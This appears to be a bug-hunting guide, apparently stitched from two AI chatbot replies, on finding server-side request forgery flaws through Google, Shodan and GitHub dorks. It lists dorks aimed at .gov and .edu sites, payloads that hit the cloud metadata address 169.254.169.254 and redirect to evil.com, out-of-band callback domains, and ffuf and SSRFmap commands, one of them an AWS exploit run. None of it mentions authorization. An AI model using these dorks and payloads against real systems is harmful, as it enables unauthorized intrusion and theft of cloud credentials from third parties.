# Dorking-for-SSRF-
Dorking for **SSRF (Server-Side Request Forgery)** vulnerabilities involves using search engines (usually Google, Bing, or Shodan) to find URLs or parameters that are likely to interact with server-side fetch/request functionality. These parameters can then be tested for SSRF.

---

### 🔍 1. **Understanding SSRF Dorking**

SSRF occurs when a server fetches a remote resource (like a URL) provided by the user. The goal is to find URLs or parameters that trigger backend HTTP requests.

Look for:

* `url=`
* `uri=`
* `link=`
* `src=`
* `target=`
* `next=`
* `data=`
* `redirect=`
* `domain=`
* `file=`
* `image=`
* `feed=`
* `host=`

---

### 🔎 2. **Google Dorks for SSRF**

Here are **useful Google Dorks** to find URLs that might be vulnerable:

```
inurl:"url=" intext:"http"
inurl:"redirect=" intext:"http"
inurl:"?next=http" site:*.gov
inurl:"?img_url=http" OR inurl:"?proxy=http"
inurl:"load.php?url="
inurl:"api.php?url="
inurl:"fetch?uri="
inurl:"file=http"
inurl:"src=http" site:*.edu
```

**Examples:**

```
site:example.com inurl:"url="
site:*.gov inurl:"redirect="
site:*.edu inurl:"file=http"
```

---

### 🛰 3. **Shodan Dorks (SSRF with Internal Services)**

Shodan is useful for identifying servers exposing internal or SSRF-prone services.

Example Shodan Queries:

```
http.title:"Dashboard" port:80
http.html:"url=" country:"BD"
```

---

### 🧪 4. **Testing Found URLs for SSRF**

After collecting URLs, use tools like:

* [`curl`](https://curl.se/)
* [`ffuf`](https://github.com/ffuf/ffuf)
* [`SSRFire`](https://github.com/RandomRobbieBF/SSRFmap)
* [`Burp Suite`](https://portswigger.net/burp)
* [`Ghauri`](https://github.com/r0oth3x49/ghauri) (for automated injection detection)

Payload Examples:

```bash
http://target.com/page?url=http://127.0.0.1:80
http://target.com/page?url=http://169.254.169.254/latest/meta-data/
http://target.com/page?next=https://evil.com/
```

You can automate with a script or use `ffuf`:

```bash
ffuf -u "http://target.com/page?url=FUZZ" -w urls.txt
```

---

### 🛠 5. **Custom Wordlist for SSRF Parameters**

Create your own SSRF param wordlist (`ssrf-params.txt`):

```
url=
uri=
redirect=
next=
data=
file=
img_url=
image=
link=
host=
src=
```

Then fuzz endpoints like:

```bash
ffuf -u "http://target.com/FUZZ=http://127.0.0.1" -w ssrf-params.txt
```

---

### 🛡 6. **Tips for Finding SSRF**

* Always test with **localhost**, **127.0.0.1**, or **internal cloud IPs** (`169.254.169.254`).
* Test for **DNS resolution**, **error messages**, or **timeouts**.
* SSRF to cloud services (AWS/GCP metadata URLs) can leak credentials.

---

Want a Bash or Python tool to automate SSRF dorking and scanning? Let me know.
Absolutely! Here are **more advanced and unique dorking examples** and **targeted patterns** for finding potential SSRF vulnerabilities using Google, Shodan, and even GitHub:

---

## ✅ Google Dorks (Advanced SSRF Targets)

Here are **more dork patterns** that focus on SSRF-prone parameters:

```
inurl:"?devUrl=http" 
inurl:"?returnUrl=http"
inurl:"/redirect?target=" 
inurl:"/api/load?uri="
inurl:"fetch?url=http"
inurl:"?open=http"
inurl:"proxy?path="
inurl:"?data=http"
inurl:"external?link="
inurl:"endpoint=http"
inurl:"external?url="
inurl:"src=http" filetype:xml
inurl:"url=" filetype:pdf
inurl:"callbackUrl=http"
inurl:"?background=http"
inurl:"/rss?feed=http"
inurl:"?continue=http"
inurl:"?dest=http"
inurl:"?referenceUrl=http"
```

---

### 🎯 Targeted Google Dork Examples

Target specific domains or TLDs:

```bash
site:*.edu inurl:"redirect="
site:*.gov inurl:"url="
site:*.org inurl:"?next="
site:*.com inurl:"link=http"
site:*.co.in inurl:"url=" filetype:xml
```

To find APIs:

```
inurl:"/api/" inurl:"?url="
inurl:"/api/v1/resource?url="
```

---

## 🔍 Shodan Dorks for SSRF

Shodan can help find servers with open endpoints vulnerable to SSRF:

```sh
http.favicon.hash:-247388890  # Jenkins (fetches remote files)
http.title:"API" port:80
http.html:"url=" "param"
http.component:"Apache" "url="
```

---

## 🔍 GitHub Dorks (Find Code Vulnerable to SSRF)

GitHub can reveal vulnerable code (devs hardcoding SSRF-prone logic):

```
filename:*.php "file_get_contents($_GET['url']"
filename:*.py "requests.get(request.args.get('url'))"
filename:*.js "fetch(req.query.url)"
filename:*.go "http.Get(request.URL.Query().Get(\"url\"))"
```

You can search these in GitHub like:

```
https://github.com/search?q=filename%3A*.php+"file_get_contents($_GET['url']"
```

---

## 🧠 Bonus: SSRF Payloads to Test Found Targets

Once you have found a target using a dork (e.g., `example.com?url=`), test with:

### 🧪 Basic SSRF Test Payloads

```text
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://0.0.0.0/
http://internal.example.com/
```

### 🕳 DNS Logging Payloads (Detect blind SSRF)

Use services like:

* `http://yourdomain.burpcollaborator.net`
* `http://yourdomain.requestbin.net`
* `http://yourdomain.oast.me`

Example:

```
http://target.com/page?url=http://ssrf-test.oast.me
```

---

## 🚀 Bonus Tool-Based Automation

You can combine your dorking finds with tools like:

* **ParamSpider** (discover SSRF-prone params):
  `paramspider -d example.com --exclude woff,css,png,svg`

* **ffuf** + SSRF param wordlist:

```bash
ffuf -u "https://example.com/?FUZZ=http://127.0.0.1" -w ssrf-params.txt
```

* **SSRFmap**:

```bash
python3 ssrfmap.py -l urls.txt -p url --exploit aws
```

---

Would you like a **custom script** or tool that:

1. **Dorks automatically**
2. **Finds parameters**
3. **Tests for SSRF**

Let me know — I can build it in Bash or Python for you.

